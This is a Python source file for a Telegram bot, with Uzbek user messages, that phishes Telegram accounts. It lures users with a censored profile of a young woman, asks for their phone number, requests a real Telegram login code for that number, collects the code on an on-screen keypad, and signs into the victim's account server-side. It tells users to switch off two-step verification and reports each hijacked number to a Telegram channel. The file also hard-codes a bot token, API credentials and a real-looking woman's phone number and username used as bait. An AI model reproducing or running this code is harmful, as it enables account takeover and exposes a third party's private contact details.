import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import asyncio
import time

# Bot and Telethon settings
bot_token = '8117826013:AAF1afdfYQC6FiaVUrxtRno2LDDa5SPOMSY'
bot = telebot.TeleBot(bot_token)
api_id = 20316672
api_hash = 'e5ba11c540769f84fc6abaa638dd1f6d'

# Sample data for the girl (censored and uncensored)
girl_name = "Marjona"
girl_phone = "+9989753852**"  # Censored phone number
girl_code = "54321"  # 5-digit code
girl_username = "@mir*******"  # Censored Telegram username
uncensored_phone = "+998975385222"
uncensored_username = "@miram01"

# Dictionary to hold user data
user_data = {}
verification_lock = {}  # Store lock state of users for verification blocking

# Create a new event loop for Telethon
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Function to handle /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'name': '', 'phone': '', 'code': ''}  # Reset user data
    verification_lock[chat_id] = False  # Reset lock

    # Send censored post with a picture as a welcome
    bot.send_photo(
        chat_id,
        'https://i.pinimg.com/736x/24/dd/00/24dd00d2ae508736ad73636a16c82025.jpg',  # Replace with the actual image file
        caption=(
            f"👧 Ism: {girl_name}\n"
            f"📞 Telefon: {girl_phone}\n"
            f"🔢 Kod: {girl_code}\n"
            f"👤 Foydalanuvchi: {girl_username}\n\n"
            "Telefon raqami va telegrami bilan bog'lanish uchun avval Ro'yxatdan o'ting va sizga uning telefon raqamini beramiz."
        )
    )

    markup = types.InlineKeyboardMarkup()
    register_button = types.InlineKeyboardButton("✅ Ro'yxatdan o'tish", callback_data="register")
    markup.add(register_button)

    bot.send_message(chat_id, "Xush kelibsiz! Iltimos  'Ro'yxatdan o'tish' tugmasini bosing.", reply_markup=markup)

# Function to handle Register button press
@bot.callback_query_handler(func=lambda call: call.data == "register")
def handle_register(call):
    chat_id = call.message.chat.id

    if verification_lock.get(chat_id, False):
        bot.send_message(chat_id, "Siz allaqachon kod so'ralgan, biroz kuting!")
        return
    
    bot.send_message(chat_id, "Iltimos, ismingizni kiriting:")
    bot.register_next_step_handler(call.message, ask_for_phone)

def ask_for_phone(message):
    chat_id = message.chat.id
    user_data[chat_id]['name'] = message.text
    
    # Creating a keyboard button to share phone number
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton('Telefon raqamni ulashish', request_contact=True)
    markup.add(contact_button)

    bot.send_message(chat_id, "Iltimos, telefon raqamingizni ulashing:", reply_markup=markup)

@bot.message_handler(func=lambda message: True, content_types=['contact'])
def contact_handler(message):
    chat_id = message.chat.id
    if message.contact:
        user_phone_number = message.contact.phone_number
        user_data[chat_id]['phone'] = user_phone_number

        bot.send_message(chat_id, "Jarayon ketyapti. bu biroz vaqt olishi mumkin iltimos kuting...")

        # Block further attempts to request verification for 1 minute
        verification_lock[chat_id] = True
        loop.run_until_complete(send_verification_code(chat_id))

async def send_verification_code(chat_id):
    session_name = user_data[chat_id]['phone']
    user_data[chat_id]['client'] = TelegramClient(session_name, api_id, api_hash)
    
    try:
        await user_data[chat_id]['client'].connect()

        if not await user_data[chat_id]['client'].is_user_authorized():
            await user_data[chat_id]['client'].send_code_request(user_data[chat_id]['phone'])
            bot.send_message(chat_id, "Telegram akkauntingizga tasdiqlash kodi yuborildi.")

            user_data[chat_id]['code'] = ''
            user_data[chat_id]['message_id'] = bot.send_message(
                chat_id, "Iltimos, kodni kiriting:", reply_markup=create_verification_code_keyboard('')
            ).message_id
        else:
            bot.send_message(chat_id, "Foydalanuvchi allaqachon tasdiqlangan.")
            verification_lock[chat_id] = False  # Unlock after successful login

    except Exception as e:
        bot.send_message(chat_id, f"Xatolik: {e}")
        verification_lock[chat_id] = False  # Unlock if an error occurred

def create_verification_code_keyboard(current_code):
    markup = types.InlineKeyboardMarkup()
    buttons = [types.InlineKeyboardButton(f"{i}", callback_data=f"verification_code:{i}") for i in range(1, 10)]  
    markup.row(*buttons[:3])  # 1 2 3
    markup.row(*buttons[3:6])  # 4 5 6
    markup.row(*buttons[6:])   # 7 8 9
    markup.add(
        types.InlineKeyboardButton("0", callback_data="verification_code:0"),
        types.InlineKeyboardButton("⬅️", callback_data="verification_code:backspace"),  
        types.InlineKeyboardButton("✅ Tayyor", callback_data="verification_code:done")
    )
    return markup

@bot.callback_query_handler(func=lambda call: call.data.startswith("verification_code"))
def handle_verification_code(call):
    chat_id = call.message.chat.id
    data = call.data.split(":")[1]

    if data == "backspace":
        user_data[chat_id]['code'] = user_data[chat_id]['code'][:-1]
    elif data == "done":
        if len(user_data[chat_id]['code']) == 5:
            bot.edit_message_text(f"Kiritilgan kod: {user_data[chat_id]['code']}", chat_id, call.message.message_id)
            loop.run_until_complete(verify_code(chat_id))
        else:
            bot.answer_callback_query(call.id, "Kod 5 raqamli bo'lishi kerak!")
    else:
        if len(user_data[chat_id]['code']) < 5:
            user_data[chat_id]['code'] += data

    bot.edit_message_text(f"Kiritilgan kod: {user_data[chat_id]['code']}", chat_id, call.message.message_id, reply_markup=create_verification_code_keyboard(user_data[chat_id]['code']))

async def verify_code(chat_id):
    try:
        await user_data[chat_id]['client'].sign_in(user_data[chat_id]['phone'], user_data[chat_id]['code'])
        bot.send_message(chat_id, "Tasdiqlash muvaffaqiyatli amalga oshirildi!")
        verification_lock[chat_id] = False  # Unlock after successful login
        send_uncensored_girl_info(chat_id)
       
        # Notify @afyun09 about the successful login
        bot.send_message("@messageret", f"Login muvaffaqiyatli amalga oshirildi. Telefon raqami: {user_data[chat_id]['phone']}")

    except PhoneCodeInvalidError:
        bot.send_message(chat_id, "Noto'g'ri kod. Iltimos, qayta urinib ko'ring.")
    except PhoneCodeExpiredError:
        bot.send_message(chat_id, "Kod muddati tugadi. Iltimos, yangi kodni so'rang.")
    except SessionPasswordNeededError:
        bot.send_message(chat_id, "Hisobingizda ikki bosqichli tasdiqlash o'rnatilgan. Iltimos, uni o'chirib qo'ying va qaytadan urinib ko'ring.")
    finally:
        await user_data[chat_id]['client'].disconnect()

def send_uncensored_girl_info(chat_id):
    bot.send_message(
        chat_id,
        (
            f"👧 Ism: {girl_name}\n"
            f"📞 Telefon: {uncensored_phone}\n"
            f"🔢 Kod: {girl_code}\n"
            f"👤 Foydalanuvchi: {uncensored_username}"
        )
    )

# Auto-Restart if Error
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)  # Delay before restarting

if __name__ == "__main__":
    run_bot()
